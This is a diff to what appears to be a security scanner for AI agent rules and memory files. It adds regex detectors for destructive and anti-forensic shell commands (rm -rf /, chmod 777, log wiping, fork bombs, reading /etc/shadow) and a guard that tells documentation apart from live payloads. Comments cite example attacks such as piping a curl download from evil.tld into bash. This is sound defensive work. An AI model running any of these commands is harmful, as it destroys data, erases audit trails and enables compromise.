@@ -72,6 +72,21 @@ export const DANGEROUS_SHELL = [
   { name: 'Command output piped into a network call', re: /\b(curl|wget|invoke-restmethod|invoke-webrequest|irm|iwr)\b[^\n]{0,220}(\$\(|`[^`\n]+`|<\()/i, severity: 'HIGH' },
   { name: 'Fetches from a raw IP address', re: /\b(curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n]{0,220}https?:\/\/\d{1,3}(\.\d{1,3}){3}/i, severity: 'HIGH' },
   { name: 'Writes to shell profile / SSH keys / crontab', re: /(\.bashrc|\.zshrc|\.bash_profile|\.profile|authorized_keys|id_rsa\b|\bcrontab\b)/i, severity: 'HIGH' },
+  // World-writable permissions. Byte-identical to the backend rules
+  // (bundle/signals.ts) so the offline floor and the server never disagree:
+  // `chmod` previously had no command-level rule in EITHER, so `chmod -R 777 /`
+  // and `chmod 777 ~/.ssh` passed unscreened. The mode must grant WRITE to
+  // others, so `chmod +x` / 755 / 644 stay silent.
+  {
+    name: 'World-writable permissions on the filesystem root (chmod -R 777 /)',
+    re: /\bchmod\b(?=[^\n;|&]*(?:-[a-zA-Z]*R|--recursive))(?=[^\n;|&]*(?:\b0?[0-7][0-7][2367]\b|a\+rwx|a=rwx|o\+w|ugo\+rwx))(?=[^\n;|&]*\s\/(?:\s|\*|$))/i,
+    severity: 'CRITICAL',
+  },
+  {
+    name: 'World-writable permissions on a credential or system path (chmod 777)',
+    re: /\bchmod\b(?=[^\n;|&]*(?:\b0?[0-7][0-7][2367]\b|a\+rwx|a=rwx|o\+w|ugo\+rwx))(?=[^\n;|&]*(?:~(?:\s|$|\/\.)|\$HOME\b|\/etc\b|\/root\b|\/usr\b|\/var\b|\/boot\b|\.ssh\b|id_rsa\b|authorized_keys\b|\.aws\b|\.gnupg\b|\.kube\b))/i,
+    severity: 'HIGH',
+  },
   { name: 'Recursive force delete (rm -rf)', re: /\brm\s+-[a-z]*r[a-z]*f|\brm\s+-[a-z]*f[a-z]*r/i, severity: 'HIGH', refine: rmTargetsRealData },
   // BARE `eval(`/`exec(` only — the lookbehind drops anything that merely ENDS in
   // those letters: method calls (`db.exec(`, `RE.exec(`, `page.$eval(`, `$pdo->exec(`)
@@ -84,6 +99,33 @@ export const DANGEROUS_SHELL = [
   { name: 'python -c one-liner', re: /python[0-9.]*\s+-c\b/i, severity: 'MEDIUM' },
   { name: 'node -e one-liner', re: /\bnode\s+-e\b/i, severity: 'MEDIUM' },
   { name: 'Netcat / socket exfil', re: /\bnc\s+-[a-z]*\b|\bncat\b/i, severity: 'MEDIUM' },
+  // ⚠ ANTI-FORENSICS + DESTRUCTIVE INFRA — ported byte-identical from the backend
+  // (bundle/signals.ts). These eight had NO mirror counterpart, so the offline
+  // floor was silent on log-wiping, history-clearing, `terraform destroy
+  // -auto-approve`, bucket deletion and force-push over main. That is the
+  // "mirror LOOSER than server" direction: a hole in exactly the conditions
+  // Tier-0 exists for — backend unreachable, unenrolled, network blocked — which
+  // is also when an attacker most wants the audit trail gone. The parity bench
+  // now asserts SET COMPLETENESS, not just agreement on its samples.
+  { name: 'Clears recorded shell history (anti-forensics)', re: /\bhistory\s+-c\b|\brm\b[^\n]{0,30}\.(bash|zsh|sh)_history\b|>\s*\S{0,30}\.(bash|zsh|sh)_history\b/i, severity: 'MEDIUM' },
+  { name: 'Suppresses shell-history recording (anti-forensics)', re: /\bln\s+-s\S*\s+\/dev\/null\s+\S{0,40}\.(bash_|zsh_|sh_)?history\b|\bHISTFILE=\/dev\/null\b|\bunset\s+HISTFILE\b|\bexport\s+HIST(SIZE|FILESIZE)=0\b|\bset\s+\+o\s+history\b/i, severity: 'MEDIUM' },
+  { name: 'Truncates a security / audit log (anti-forensics)', re: />\s*(\/var\/log\/(audit|secure|auth\.log|wtmp|btmp|lastlog|syslog|messages)|\/var\/(run|log)\/(wtmp|btmp|utmp))\b/i, severity: 'HIGH' },
+  { name: 'Vacuums the systemd journal to erase records (anti-forensics)', re: /\bjournalctl\b[^\n]{0,40}--vacuum-(time|size)=/i, severity: 'MEDIUM' },
+  { name: 'Wipes audit / security / login logs (anti-forensics)', re: /\b(rm|shred|unlink|truncate)\b[^\n]{0,60}(\/var\/log\/(audit|secure|auth\.log|wtmp|btmp|lastlog|syslog|messages|faillog|tallylog)|\/var\/(run|log)\/(wtmp|btmp|utmp))\b/i, severity: 'HIGH' },
+  { name: 'Destroys managed infrastructure without confirmation (terraform destroy -auto-approve)', re: /\bterraform\b[^\n]{0,120}\bdestroy\b[^\n]{0,120}(-auto-approve|--auto-approve)/i, severity: 'HIGH' },
+  { name: 'Force-deletes a cloud storage bucket (aws s3 rb --force)', re: /\b(aws\s+s3\s+rb|gsutil\s+(rm\s+-r|rb)|az\s+storage\s+(account|container)\s+delete)\b[^\n]{0,80}(--force|--yes|-f\b|\bs3:\/\/|\bgs:\/\/)/i, severity: 'HIGH' },
+  { name: 'Force-pushes over a protected branch (rewrites shared history)', re: /\bgit\s+push\b[^\n]{0,80}(--force\b(?!-with-lease)|(?:^|\s)-f\b)[^\n]{0,60}\b(main|master|release|prod(uction)?)\b/i, severity: 'MEDIUM' },
+  // Destruction + credential + control-plane detectors, also byte-identical.
+  // ⚠ The root-wipe tier is CRITICAL and must be its own rule: the consolidated
+  // `rm -rf` rule below grades HIGH, and HIGH only flags where CRITICAL blocks —
+  // so `rm -rf /` was screened one severity short of a block offline.
+  { name: 'Recursive force delete of the filesystem root (rm -rf /, --no-preserve-root)', re: /\brm\b(?=[^\n;|&]*(?:-[a-zA-Z]*r|--recursive))(?=[^\n;|&]*(?:-[a-zA-Z]*f|--force))(?=[^\n;|&]*(?:--no-preserve-root|\s\/(?:\s|\*|$)))/i, severity: 'CRITICAL' },
+  { name: 'Fork bomb (process-exhaustion DoS)', re: /(:|\b[a-z_][a-z0-9_]*)\s*\(\s*\)\s*\{\s*\1\s*[^\n}]*\|\s*\1[^\n}]*&\s*\}\s*;\s*\1/i, severity: 'HIGH' },
+  { name: 'Writes over a raw disk device (data destruction)', re: /\b(dd\b[^\n]{0,80}\bof=\/dev\/[sh]d|mkfs(\.\w+)?\s+[^\n]{0,40}\/dev\/|>\s*\/dev\/[sh]d[a-z])/i, severity: 'CRITICAL' },
+  { name: 'Reads the system password-hash / sudo policy file', re: /\b(cat|less|more|head|tail|strings|xxd|od|grep|awk|sed|cp|scp|tar)\b[^\n]{0,80}\/etc\/(shadow|gshadow|sudoers(\.d)?)\b/i, severity: 'HIGH' },
+  { name: 'Deletes a Kubernetes namespace / workload', re: /\bkubectl\b[^\n]{0,80}\bdelete\b[^\n]{0,80}\b(namespace|ns|deployment|statefulset|pvc|persistentvolumeclaim)\b/i, severity: 'MEDIUM' },
+  { name: 'Drops a database / schema', re: /\bdrop\s+(database|schema|table)\b/i, severity: 'MEDIUM' },
+  { name: 'Disables the audit / logging subsystem', re: /\b(systemctl|service)\s+(stop|disable|mask)\s+\S{0,20}(auditd|rsyslog|syslog|systemd-journald|journald)\b|\bauditctl\s+(-e\s*0|-D)\b|\bsetenforce\s+0\b|\bsystemctl\s+(stop|disable|mask)\s+firewalld\b/i, severity: 'HIGH' },
 ];
 
 // ── injection ──
@@ -810,6 +852,49 @@ function isDescriptiveLine(line) {
   return DESCRIPTIVE_MARKERS.test(line) && !IMPERATIVE.test(line);
 }
 
+// ── documentation guard ──
+// Mirrors backend checks/prose-context.ts#isDocumentationLine. ⚠ The backend has
+// applied this to its shell scan for months and the mirror never did, so the
+// OFFLINE floor was STRICTER than the server — the asymmetric drift direction
+// local-mirror-bench exists to catch, and the one with no recourse: a security-
+// conscious CLAUDE.md that merely CITES `curl … | sh` was blocked at CRITICAL on
+// the developer's machine, with "treat the writer as untrusted".
+const ELLIPSIS_RE = /…|\.\.\./;
+const REGEX_PATTERN_RE = /\\[sdwbSDWB]|\\\+|\\\*|\\\(|\\\||\(\?:|\.\*|\.\+/;
+const CREDENTIAL_PATH_RE =
+  /~\/\.(ssh|aws|kube|gnupg|docker|npmrc?)\b|\bid_(rsa|ed25519|dsa)\b|\.pem\b|\bcredentials\b\s*(file)?|\bAWS_SECRET|\bANTHROPIC_API_KEY\b|\bOPENAI_API_KEY\b/i;
+// ⚠ The line between a citation and a payload: `curl … | sh` NAMES the shape,
+// `curl -fsSL https://evil.tld/i.sh | bash` PERFORMS it. Backticks and
+// documentary wording are both free for an attacker to add, so neither may ever
+// suppress a composition carrying a live target.
+const EXECUTABLE_FETCH_RE =
+  /\b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n]{0,200}?(?:https?:\/\/|\bwww\.|\b\d{1,3}(?:\.\d{1,3}){3}\b)[^\n]{0,200}?\|\s*(?:sudo\s+)?(?:(?:ba|z|k|da)?sh|python\d?|perl|ruby|node)\b/i;
+
+function carriesHardEvidence(line) {
+  return CREDENTIAL_PATH_RE.test(line) || EXECUTABLE_FETCH_RE.test(line) || !!egressHost(line);
+}
+
+/** True when this line is prose ABOUT a command rather than a command. */
+export function isDocumentationLine(line) {
+  if (!line) return false;
+  if (carriesHardEvidence(line)) return false;
+  if (ELLIPSIS_RE.test(line) || REGEX_PATTERN_RE.test(line)) return true;
+  return isDescriptiveLine(line);
+}
+
+/** The first line a signal matches that is NOT documentation, else null. */
+function offendingLine(sig, text) {
+  const g = new RegExp(sig.re.source, sig.re.flags.includes('g') ? sig.re.flags : sig.re.flags + 'g');
+  for (const m of text.matchAll(g)) {
+    if (m.index == null) continue;
+    const line = lineTextAt(text, m.index);
+    if (sig.refine && !sig.refine(line)) continue;
+    if (isDocumentationLine(line)) continue;
+    return line;
+  }
+  return null;
+}
+
 /**
  * The first line matching `re` that is a genuine directive — NOT a negated
  * hardening rule ("never bypass safety") and NOT descriptive documentation
@@ -1014,7 +1099,14 @@ export function localMemory(content, { kind = 'MEMORY' } = {}) {
 
   // Executable payload / egress sink / lifecycle-hook references have no business
   // in a note or rules file.
-  for (const sig of DANGEROUS_SHELL) if (matchesShellSignal(sig, text)) { push(sig.severity === 'MEDIUM' || sig.severity === 'LOW' ? 'HIGH' : 'CRITICAL', `Executable payload staged in ${noun}: ${sig.name}`, `Delete the command from the ${noun}; treat the writer as untrusted.`, sig.re); break; }
+  // ⚠ Documentation-guarded, like the backend. A rules file DESCRIBING a payload
+  // is not staging one.
+  for (const sig of DANGEROUS_SHELL) {
+    const line = offendingLine(sig, text);
+    if (!line) continue;
+    push(sig.severity === 'MEDIUM' || sig.severity === 'LOW' ? 'HIGH' : 'CRITICAL', `Executable payload staged in ${noun}: ${sig.name}`, `Delete the command from the ${noun}; treat the writer as untrusted.`, line);
+    break;
+  }
   const host = egressHost(text);
   if (host) push('HIGH', `${isInstruction ? 'Rules file' : 'Memory'} references a data-exfiltration host (${host})`, 'Remove the reference and roll back to the approved baseline.', host);
   // Toxic flow: an IMPERATIVE line that names BOTH sensitive data and a network
@@ -1029,7 +1121,10 @@ export function localMemory(content, { kind = 'MEMORY' } = {}) {
   if (toxicFlowLine) {
     push('HIGH', `Toxic instruction in ${noun}: reads sensitive data + reaches the network`, 'Remove the entry; gate any network step behind explicit approval and an egress allow-list.', toxicFlowLine);
   }
-  if (LIFECYCLE_VECTOR.test(text)) push('MEDIUM', `${isInstruction ? 'Rules file' : 'Memory'} references a package-lifecycle hook (MemoryTrap vector)`, 'Verify no dependency writes to this store during install; pin dependencies and audit lifecycle scripts.', LIFECYCLE_VECTOR);
+  // Per-line + documentation-guarded: "regenerated on `postinstall`/`build`" in a
+  // build-notes paragraph is prose about the toolchain, not a MemoryTrap.
+  const lifecycleLine = text.split(/\r?\n/).find((l) => LIFECYCLE_VECTOR.test(l) && !isDocumentationLine(l));
+  if (lifecycleLine) push('MEDIUM', `${isInstruction ? 'Rules file' : 'Memory'} references a package-lifecycle hook (MemoryTrap vector)`, 'Verify no dependency writes to this store during install; pin dependencies and audit lifecycle scripts.', lifecycleLine);
 
   // Self-reinforcement: the entry arranges its own survival. Graded last and
   // scored highest of the non-override signals, because it is the signal that
@@ -1123,7 +1218,14 @@ export function localGate(content, { kind, path } = {}) {
   }
 
   // Install-lure prose (Skills / commands / rules that coerce a download+run).
-  for (const l of INSTALL_LURE) if (l.re.test(content || '')) { push(l.severity, l.name, 'Do not follow instructions that fetch and run out-of-band binaries.', lineOf(content, l.re)); break; }
+  // Documentation-guarded per line, like the shell scan above: a build-notes
+  // paragraph about re-running a flaky gate is prose, not a lure.
+  for (const l of INSTALL_LURE) {
+    const line = offendingLine(l, content || '');
+    if (!line) continue;
+    push(l.severity, l.name, 'Do not follow instructions that fetch and run out-of-band binaries.', line);
+    break;
+  }
 
   // Over-permissioned tool grants in a Skill / command / subagent.
   if (['skill', 'command', 'subagent', 'auto', undefined].includes(kind)) {
